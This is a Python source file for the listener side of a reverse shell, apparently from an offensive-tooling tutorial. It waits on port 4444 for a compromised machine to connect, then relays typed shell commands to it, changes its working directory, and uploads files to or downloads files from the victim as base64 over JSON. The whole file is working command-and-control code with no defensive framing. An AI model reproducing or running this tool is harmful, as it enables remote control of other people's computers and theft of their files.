import socket
import sys
import json
import base64


class Listener:

    def __init__(self,ip,port):
        
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.bind((ip,port))
        self.listener.listen(0)
        print("\n[+] Waiting for incoming connection.")
        self.conn, addr = self.listener.accept()
        print("\nGot Connection from "+str(addr))

    def send_data(self,data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(2048).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                if json_data =="":
                    break
                continue

    def sharing_data(self,data):
        self.send_data(data)
        if data[0] == "exit":
                self.conn.close()
                sys.exit()
        return self.receive_data()

    def download_file(self,filename,content):
        with open(filename,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successfull"

    def upload_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    def run(self):
        cur_dir = ">> "
        
        while True:
            data = input(cur_dir,)
            data = data.split(" ")
            
            if data[0] == "upload":
                path = " ".join(data[1:10])
                content = self.upload_file(path).decode()
                data.append(content)

            response = self.sharing_data(data)
            if data[0] == "cd" and len(data) >= 2:
                cur_dir = response
                response = "Directory changed to "+ data[1]

            elif data[0] == "download":
                file = " ".join(data[1:10])
                file_name = file.split("\\")[-1]
                response = self.download_file(file_name,response.encode())

            print(response)
    
while 1:
    try:
        listening = Listener("127.0.0.1",4444)
        listening.run()
    except Exception:
        print("An existing connection is disconnected")
        listening.listener.close()
        continue
    except KeyboardInterrupt:
        listening.listener.close()
        print("\n[+] Quitting...")
        sys.exit()